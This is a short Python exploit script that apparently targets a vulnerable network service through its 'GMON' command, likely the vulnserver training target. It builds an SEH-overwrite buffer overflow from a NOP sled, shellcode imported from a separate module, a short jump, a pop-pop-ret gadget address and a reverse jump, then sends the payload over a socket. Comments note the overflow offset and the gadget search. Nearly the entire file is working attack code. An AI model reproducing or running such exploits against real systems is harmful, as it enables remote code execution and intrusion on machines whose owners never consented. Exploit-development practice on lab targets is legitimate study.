#!/usr/bin/python
from pwn import *
import sys
import shellcode

# cyclic_find(0x6E6A6261) = 3547
# 0x77684b1b
# r2 search: "/R/ pop *;pop *;ret"

server, sport = sys.argv[1:3]
s = socket.socket()
connect = s.connect((server, int(sport)))
#print(s.recv(1024))


#prefix = b"\x90" * 3547

prefix = b"\x90" * 100
prefix += shellcode.buf
prefix += b"\x90" * (3547-len(prefix))

short_jmp = b"\xeb\x06\x90\x90"
popret = p32(0x625010b4)
rev_jmp = b"\xe9" + struct.pack("<i", -3550)
suffix = b"B" * (4000-3557-1)
payload = prefix + short_jmp + popret + rev_jmp + suffix

#payload = cyclic(4000)

s.send((b'GMON /.:/' + payload + b'\r\n'))
print(s.recv(1024))
